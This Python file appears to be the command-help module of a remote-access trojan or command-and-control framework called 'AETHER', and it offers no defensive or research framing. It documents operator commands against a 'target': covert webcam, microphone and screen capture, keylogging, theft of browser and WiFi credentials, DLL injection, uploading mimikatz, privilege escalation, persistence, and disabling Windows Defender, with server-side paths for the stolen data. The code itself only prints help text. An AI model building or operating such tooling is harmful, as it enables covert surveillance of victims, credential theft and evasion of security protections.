#!/usr/bin/env python3
"""
AETHER Command Help System
Comprehensive help and detailed information for all commands
"""

# Command help database
COMMAND_HELP = {
    # System Information
    'whoami': {
        'description': 'Display the current user context',
        'usage': 'whoami',
        'options': 'None',
        'example': 'whoami',
        'output': 'Returns current username and domain (e.g., DOMAIN\\admin)',
        'category': 'System Information',
    },
    
    'hostname': {
        'description': 'Get the target computer name',
        'usage': 'hostname',
        'options': 'None',
        'example': 'hostname',
        'output': 'Returns the computer name (e.g., DESKTOP-PC01)',
        'category': 'System Information',
    },
    
    'sysinfo': {
        'description': 'Gather detailed system information',
        'usage': 'sysinfo',
        'options': 'None',
        'example': 'sysinfo',
        'output': 'OS version, architecture, RAM, CPU info, uptime, etc.',
        'category': 'System Information',
    },
    
    # File Operations
    'ls': {
        'description': 'List directory contents',
        'usage': 'ls <path>',
        'options': '-a (all files), -l (detailed), -r (recursive)',
        'example': 'ls C:\\Users\\admin\\Documents',
        'output': 'File listing with sizes and dates',
        'output_location': 'Console output (no file saved)',
        'category': 'File Operations',
    },
    
    'cat': {
        'description': 'Read and display file contents',
        'usage': 'cat <filepath>',
        'options': 'None',
        'example': 'cat C:\\Windows\\System32\\drivers\\etc\\hosts',
        'output': 'File contents displayed in terminal',
        'output_location': 'Console output (no file saved)',
        'category': 'File Operations',
    },
    
    'mkdir': {
        'description': 'Create a new directory',
        'usage': 'mkdir <path>',
        'options': '-p (create parent directories)',
        'example': 'mkdir C:\\temp\\aether',
        'output': 'Confirmation message on success',
        'category': 'File Operations',
    },
    
    'rm': {
        'description': 'Delete a file or directory',
        'usage': 'rm <path>',
        'options': '-r (recursive), -f (force)',
        'example': 'rm C:\\temp\\malware.exe',
        'output': 'Deletion confirmation',
        'category': 'File Operations',
    },
    
    'mv': {
        'description': 'Move or rename files/directories',
        'usage': 'mv <source> <destination>',
        'options': '-f (force)',
        'example': 'mv C:\\file.txt D:\\backup\\file.txt',
        'output': 'Move confirmation',
        'category': 'File Operations',
    },
    
    'cd': {
        'description': 'Change working directory',
        'usage': 'cd <path>',
        'options': 'None',
        'example': 'cd C:\\Windows',
        'output': 'Changes the current working directory',
        'category': 'File Operations',
    },
    
    'pwd': {
        'description': 'Print working directory',
        'usage': 'pwd',
        'options': 'None',
        'example': 'pwd',
        'output': 'Current working directory path',
        'output_location': 'Console output',
        'category': 'File Operations',
    },
    
    'find': {
        'description': 'Search for files matching pattern',
        'usage': 'find <path> <pattern>',
        'options': '-r (recursive), -i (case-insensitive)',
        'example': 'find C:\\Users admin*.txt',
        'output': 'List of matching files',
        'category': 'File Operations',
    },
    
    # Intelligence Gathering
    'screenshot': {
        'description': 'Capture the target desktop screen',
        'usage': 'screenshot',
        'options': 'None',
        'example': 'screenshot',
        'output': 'PNG image of desktop',
        'output_location': '/var/lib/aether/screenshots/agent_<id>_<timestamp>.png',
        'category': 'Intelligence',
    },
    
    'webcam': {
        'description': 'Capture image from webcam',
        'usage': 'webcam [duration]',
        'options': 'duration (seconds, default 1)',
        'example': 'webcam 2',
        'output': 'JPG image from webcam',
        'output_location': '/var/lib/aether/webcam/agent_<id>_<timestamp>.jpg',
        'category': 'Intelligence',
    },
    
    'audio': {
        'description': 'Record audio from microphone',
        'usage': 'audio <duration>',
        'options': 'duration (seconds)',
        'example': 'audio 10',
        'output': 'WAV audio file',
        'output_location': '/var/lib/aether/audio/agent_<id>_<timestamp>.wav',
        'category': 'Intelligence',
    },
    
    'keylog': {
        'description': 'Manage keylogger module',
        'usage': 'keylog [start|stop|dump]',
        'options': 'start (begin logging), stop (stop logging), dump (retrieve log)',
        'example': 'keylog start',
        'output': 'Status message or keylog contents',
        'output_location': '/var/lib/aether/keylogs/agent_<id>.log',
        'category': 'Intelligence',
    },
    
    'clipboard': {
        'description': 'Read clipboard contents',
        'usage': 'clipboard',
        'options': 'None',
        'example': 'clipboard',
        'output': 'Current clipboard text/data',
        'output_location': 'Console output',
        'category': 'Intelligence',
    },
    
    'browser': {
        'description': 'Extract browser credentials and history',
        'usage': 'browser [chrome|firefox|edge|all]',
        'options': 'Browser type (default: all)',
        'example': 'browser chrome',
        'output': 'Passwords, cookies, history, bookmarks',
        'output_location': '/var/lib/aether/browsers/agent_<id>/cookies.json',
        'category': 'Intelligence',
    },
    
    'wifi': {
        'description': 'Extract WiFi credentials',
        'usage': 'wifi',
        'options': 'None',
        'example': 'wifi',
        'output': 'SSID and passwords from stored WiFi profiles',
        'output_location': '/var/lib/aether/wifi/agent_<id>_wifi.txt',
        'category': 'Intelligence',
    },
    
    # Process Management
    'ps': {
        'description': 'List running processes',
        'usage': 'ps [filter]',
        'options': 'filter (optional process name filter)',
        'example': 'ps explorer',
        'output': 'Process list with PID, name, memory usage',
        'output_location': 'Console output',
        'category': 'Process Management',
    },
    
    'kill': {
        'description': 'Terminate a process',
        'usage': 'kill <pid>',
        'options': '-f (force), -t (timeout ms)',
        'example': 'kill 1234',
        'output': 'Confirmation of process termination',
        'category': 'Process Management',
    },
    
    'inject': {
        'description': 'Inject DLL into process',
        'usage': 'inject <pid> <dll_path>',
        'options': 'None',
        'example': 'inject 1234 C:\\malware.dll',
        'output': 'Injection status and new thread ID',
        'category': 'Process Management',
    },
    
    # File Transfer
    'download': {
        'description': 'Download file from target to server',
        'usage': 'download <filepath>',
        'options': 'None',
        'example': 'download C:\\Users\\admin\\secret.txt',
        'output': 'File transferred to server',
        'output_location': '/var/lib/aether/downloads/agent_<id>/',
        'category': 'File Transfer',
    },
    
    'upload': {
        'description': 'Upload file from server to target',
        'usage': 'upload <server_path> <target_path>',
        'options': 'None',
        'example': 'upload /tools/mimikatz.exe C:\\Windows\\Temp\\m.exe',
        'output': 'Upload confirmation',
        'category': 'File Transfer',
    },
    
    # Privilege & Persistence
    'getsystem': {
        'description': 'Attempt privilege escalation',
        'usage': 'getsystem',
        'options': 'None (automatic method selection)',
        'example': 'getsystem',
        'output': 'Escalation result and new privileges',
        'category': 'Privilege & Persistence',
    },
    
    'persist': {
        'description': 'Install persistence mechanism',
        'usage': 'persist <method>',
        'options': 'registry, wmi, service, schtask, runkey',
        'example': 'persist registry',
        'output': 'Persistence confirmation and location',
        'category': 'Privilege & Persistence',
    },
    
    'defender': {
        'description': 'Manage Windows Defender',
        'usage': 'defender [disable|exclude|status]',
        'options': 'disable, exclude <path>, status',
        'example': 'defender disable',
        'output': 'Defender status change confirmation',
        'category': 'Evasion',
    },
    
    # Network Operations
    'netstat': {
        'description': 'Display network connections',
        'usage': 'netstat',
        'options': 'None',
        'example': 'netstat',
        'output': 'Active network connections and listening ports',
        'output_location': 'Console output',
        'category': 'Network',
    },
    
    'scan': {
        'description': 'Perform network scan',
        'usage': 'scan <subnet>',
        'options': 'None',
        'example': 'scan 192.168.1.0/24',
        'output': 'Active hosts and open ports',
        'category': 'Network',
    },
    
    'portscan': {
        'description': 'Scan specific host ports',
        'usage': 'portscan <host> <ports>',
        'options': 'Port range (e.g., 80,443,1-1000)',
        'example': 'portscan 192.168.1.10 1-65535',
        'output': 'List of open ports',
        'output_location': 'Console output',
        'category': 'Network',
    },
    
    'smb': {
        'description': 'Enumerate SMB shares',
        'usage': 'smb <host>',
        'options': 'None',
        'example': 'smb 192.168.1.5',
        'output': 'Available SMB shares and access rights',
        'category': 'Network',
    },
    
    # Help
    'help': {
        'description': 'Show help for commands',
        'usage': 'help [command]',
        'options': 'command (specific command help)',
        'example': 'help screenshot',
        'output': 'Detailed command help and usage',
        'category': 'Utility',
    },
    
    'history': {
        'description': 'Show command execution history',
        'usage': 'history [count]',
        'options': 'count (number of commands to show)',
        'example': 'history 10',
        'output': 'List of recent executed commands',
        'category': 'Utility',
    },
}


def get_command_help(command):
    """Get help for a specific command"""
    if command in COMMAND_HELP:
        return COMMAND_HELP[command]
    return None


def get_all_commands():
    """Get list of all available commands"""
    return {cmd: info['description'] for cmd, info in COMMAND_HELP.items()}


def get_commands_by_category(category=None):
    """Get commands for a specific category, or all grouped by category if no category specified"""
    if category:
        return {cmd: info for cmd, info in COMMAND_HELP.items() if info.get('category') == category}
    else:
        # Return all commands grouped by category
        grouped = {}
        for cmd, info in COMMAND_HELP.items():
            cat = info.get('category', 'Other')
            if cat not in grouped:
                grouped[cat] = []
            grouped[cat].append(cmd)
        return grouped


def format_help_text(command_name):
    """Format help text for a command"""
    help_info = get_command_help(command_name)
    if not help_info:
        return None
    
    text = f"""
╔══════════════════════════════════════════════════════════════════╗
║ Command Help: {command_name.upper()}
╚══════════════════════════════════════════════════════════════════╝

📖 Description:
   {help_info['description']}

💻 Usage:
   {help_info['usage']}

⚙️  Options:
   {help_info['options']}

📝 Example:
   {help_info['example']}

📤 Output:
   {help_info['output']}
"""
    
    if 'output_location' in help_info:
        text += f"\n📁 Output Location:\n   {help_info['output_location']}\n"
    
    text += f"\n🏷️  Category: {help_info['category']}\n"
    return text


if __name__ == '__main__':
    # Example usage
    print(format_help_text('screenshot'))
    print("\n" + "="*70 + "\n")
    print(format_help_text('download'))
